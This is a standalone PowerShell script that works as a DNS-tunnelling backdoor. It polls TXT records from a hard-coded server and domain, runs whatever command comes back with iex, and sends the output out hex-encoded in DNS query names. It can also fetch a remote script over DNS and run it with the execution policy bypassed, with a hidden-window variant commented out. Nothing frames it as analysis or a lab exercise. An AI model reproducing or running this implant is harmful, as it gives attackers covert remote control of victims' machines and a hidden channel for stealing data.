$server = '192.168.0.112'
$name = 'koratxt.com'
$id = Get-Content env:computername
if ($id.Length -gt 10) {
    $id = $id.Substring(0,10)
}

function StringToHex($i) {
    $r = ""
    $i.ToCharArray() | ForEach-Object -Process {
        $x = [int][char]$_
        if ($x -ge 32 -and $x -le 126) {
            $r += '{0:X}' -f $x
        }
    }
    return $r
}

function HexToString($i) {
    $r = ""
    for ($n = 0; $n -lt $i.length; $n += 2) {
        $r += [char][int]("0x" + $i.Substring($n,2))
    }
    return $r
}

function split_to_chunks($astring, $size=20) {
    $new_arr = @()
    $chunk_index=0
    $newastring = $astring + ("0" * $size)
    foreach($i in 1..[math]::floor($newastring.length / $size)) {
        $new_arr += StringToHex (@($newastring.substring($chunk_index,$size)))
        $chunk_index += $size
    }
    return $new_arr
}

function send_response($response) {
    $chunks = (split_to_chunks ($response.Replace("`r`n",";") -replace '\s\s+', ','))
    foreach ($j in $chunks) {
        $(Resolve-DnsName -Server $server -Name "65786563.$j.$name" -Type TXT).Strings
    }
    $(Resolve-DnsName -Server $server -Name "656e64.$name" -Type TXT)
    return $id
}

function pull_file($size=255){
    $f = New-Item -Path '.\' -Name 'txt.ps1' -ItemType File
    $h = ''
    $index = 0
    $file_size = $(Resolve-DnsName -Server $server -Name "73697a65.$name" -Type TXT).Strings
    foreach ($i in 1..[int]"$file_size") {
        $x = $(Resolve-DnsName -Server $server -Name "66696c65.$index.$name" -Type TXT).Strings
        $index += $size    
        $x | Add-Content -Path '.\txt.ps1'
    }
    $(Resolve-DnsName -Server $server -Name "656e64.$name" -Type TXT)
}

while ($true) {
    $rawtxt = $(Resolve-DnsName -Server $server -Name $name -Type TXT).Strings
    if ($rawtxt -eq "file") {
        Remove-Item 'txt.ps1'
        pull_file
    }
    elseif ($rawtxt -eq "filex") {
        Remove-Item 'txt.ps1'
        pull_file
        #Start-Job -ScriptBlock {powershell.exe -NoE -Nop -NonI -w hidden -ExecutionPolicy Bypass -File '.\txt.ps1'}
        Start-Job -ScriptBlock {powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -File '.\txt.ps1'}
        Remove-Item 'txt.ps1'
    }
    elseif ($rawtxt.length -ne 0) {
        $response = (iex "$rawtxt") | Out-String
        if ($response.Length -gt 0) {
            send_response $response
        }
    }
    sleep -Seconds 15
}